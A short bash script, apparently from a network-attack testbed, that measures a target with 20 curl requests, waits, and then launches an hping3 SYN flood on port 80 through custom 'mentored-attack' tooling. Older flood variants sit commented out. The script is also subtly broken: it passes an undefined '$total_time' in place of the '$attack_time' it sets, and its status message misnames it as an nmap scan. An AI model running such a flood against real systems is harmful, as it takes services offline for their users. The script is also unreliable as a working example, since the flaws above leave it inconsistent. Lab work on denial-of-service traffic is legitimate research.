#!/bin/bash

# Check if $1 and $2 are defined, otherwise abort
if [ -z "$1" ] || [ -z "$2" ]
then
    echo "Usage: $0 <target> <iname> [wait_time]"
    exit 1
fi

target=$1
iname=$2

# if $3 is defined, then use it as the wait time
if [ -z "$3" ]
then
    wait_time=10
else
    wait_time=$3
fi

if [ -z "$4" ]
then
    attack_time=300
else
    attack_time=$4
fi

target_ip=$(mentored-get-ip --na-regex $target --iname $iname)
echo "Executing nmap ping-wait-scan.sh with target=$target, iname=$iname, wait_time=$wait_time, target_ip=$target_ip"

echo "Executing 20 curl requests to the $target ..."
mentored-registry-action -a check-attack -o /app/results/ -n "Starting 20 curl requests to $target"
for i in {1..20}
do
    curl $target_ip > /app/results/pre_attack_curl_$i.txt
done
mentored-registry-action -a end-check-attack -o /app/results/ -n "Stopping 20 curl requests to $target"

echo "Waiting for $wait_time seconds..."
sleep $wait_time

echo "Running hping http flood attack..."
# mentored-attack hping3 $target $iname -S -p 80 -s 80 -d 120 -c 1000
# mentored-attack hping3 $target $iname -S --flood -p 80 -d 1024
# mentored-registry-action -a end-attack -o /app/results/ -n "Stopping hping http flood attack to $target"
mentored-attack hping3 $target $iname $total_time -S --flood -p 80 -d 1024

tail -f /dev/null